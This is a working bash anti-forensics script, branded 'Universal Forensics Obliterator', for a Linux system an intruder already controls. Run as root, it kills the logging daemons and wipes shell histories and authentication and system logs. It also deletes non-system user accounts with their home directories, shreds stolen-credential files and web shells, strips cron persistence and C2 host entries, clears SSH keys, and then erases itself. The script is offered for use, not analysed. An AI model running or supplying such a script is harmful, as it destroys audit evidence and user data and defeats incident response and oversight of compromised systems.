#!/bin/bash

echo ''
echo '███╗   ██╗██╗   ██╗██╗  ██╗███████╗'
echo '████╗  ██║██║   ██║██║ ██╔╝██╔════╝'
echo '██╔██╗ ██║██║   ██║█████╔╝ █████╗'
echo '██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝'
echo '██║ ╚████║╚██████╔╝██║  ██╗███████╗'
echo '╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝'
echo ''
echo '       Linux Anti-Forensics Automation Tool'
echo ''

if [ "$(id -u)" -ne 0 ]; then echo "Must be root."; exit 1; fi
SELF=$(readlink -f "$0" 2>/dev/null || echo "$0")
echo "=== UFO: Universal Forensics Obliterator ==="
echo "[*] Halting logging..."
killall -9 syslogd rsyslogd syslog-ng 2>/dev/null
echo "[*] Wiping all histories..."
for d in /root /home/*; do
    [ -d "$d" ] || continue
    rm -f "$d/.bash_history" "$d/.bash_logout" "$d/.zsh_history" "$d/.zhistory" "$d/.history" 2>/dev/null
    ln -sf /dev/null "$d/.bash_history" 2>/dev/null
done
rm -f /root/.history /root/.sh_history 2>/dev/null
case "$SHELL" in *zsh) fc -P 2>/dev/null;; *) history -c 2>/dev/null;; esac
HISTFILE=/dev/null; export HISTSIZE=0
echo "[*] Wiping logs..."
cd /var/log 2>/dev/null
for f in auth.log syslog messages debug daemon kern mail mail.info mail.warn mail.err user boot dmesg udev wtmp btmp lastlog faillog tallylog; do
    > "$f" 2>/dev/null || true; rm -f "$f"? "$f".gz "$f".?.gz 2>/dev/null
done
rm -rf apache2/* proftpd/* mysql/* postgresql/* samba/* 2>/dev/null
find /var/log -name "*.gz" -o -name "*.1" -o -name "*.old" -delete 2>/dev/null
echo "[*] Removing non-system users..."
for u in $(awk -F: '$3>=1000 && $3<65534{print$1}' /etc/passwd 2>/dev/null); do
    case "$u" in msfadmin|user|service|ftp|ubuntu|kali|vagrant) continue;; esac
    pkill -u "$u" 2>/dev/null; userdel -r "$u" 2>/dev/null
done
echo "[*] Shredding artifacts..."
shred -zun 3 /tmp/bashdoor /tmp/cc.txt /tmp/creds.txt /dev/shm/root.hash 2>/dev/null
rm -rf /tmp/.stash /tmp/.hidden* /tmp/.cache* /dev/shm/.wipe 2>/dev/null
rm -f /var/www/shell.php /var/www/backdoor.php /var/www/.shell* 2>/dev/null
find /tmp /var/tmp /dev/shm -type f -perm -4000 -exec rm -f {} \; 2>/dev/null
echo "[*] Cleaning persistence..."
sed -i '/nc -e/d; /bash -c/d; /reverse/d; /evil/d; /backdoor/d; /autowipe/d' /etc/crontab 2>/dev/null
rm -f /var/spool/cron/crontabs/* /usr/local/bin/autowipe.sh 2>/dev/null
for d in /root /home/*; do
    [ -d "$d/.ssh" ] && { > "$d/.ssh/authorized_keys" 2>/dev/null; > "$d/.ssh/known_hosts" 2>/dev/null; }
done
sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config 2>/dev/null
sed -i '/evil\.com/d; /c2-server/d; /hacker/d' /etc/hosts 2>/dev/null
ip neigh flush all 2>/dev/null
echo "[*] Wiping slack..."
dd if=/dev/zero of=/tmp/.w bs=1M count=10 2>/dev/null; rm -f /tmp/.w 2>/dev/null
dd if=/dev/zero of=/dev/shm/.w bs=1M count=10 2>/dev/null; rm -f /dev/shm/.w 2>/dev/null
echo "[+] Done. Self-destructing..."
shred -zun 3 "$SELF" 2>/dev/null; rm -f "$SELF" 2>/dev/null
case "$SHELL" in *zsh) fc -P 2>/dev/null;; *) history -c 2>/dev/null;; esac
kill -9 $$ 2>/dev/null
exit 0
